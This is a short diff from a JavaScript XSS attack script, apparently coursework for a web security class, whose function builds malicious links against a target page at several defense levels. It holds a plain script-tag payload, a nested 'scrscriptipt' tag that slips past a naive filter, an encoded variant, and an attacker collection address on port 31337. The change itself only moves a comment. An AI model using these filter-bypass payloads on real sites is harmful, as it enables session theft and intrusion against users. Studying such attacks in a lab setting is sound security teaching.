@@ -147,8 +147,7 @@ function mkLnk(xssdefense,target,atkr){
     case 0:return bQry+encodeURIComponent("<script"+">"+payLd+"</script"+">");
     case 1:
     case 2:return bQry+encodeURIComponent("<scrscriptipt>"+payLd+"</scrscriptipt"+">");
-    // Calling ncdSTR function to encode the entire payload in encodedpayLd
-    case 3:var encodedpayLd=ncdSTR("<script"+"> "+payLd+" </script"+">");return bQry+encodeURIComponent(encodedpayLd);}}
+    case 3:var encodedpayLd=ncdSTR("<script"+"> "+payLd+" </script"+">");return bQry+encodeURIComponent(encodedpayLd);}}  // Calling ncdSTR function to encode the entire payload in encodedpayLd
 const target = "http://526.edu/project2b/";
 const atkr =  "http://192.168.1.1:31337/";
 $(function(){
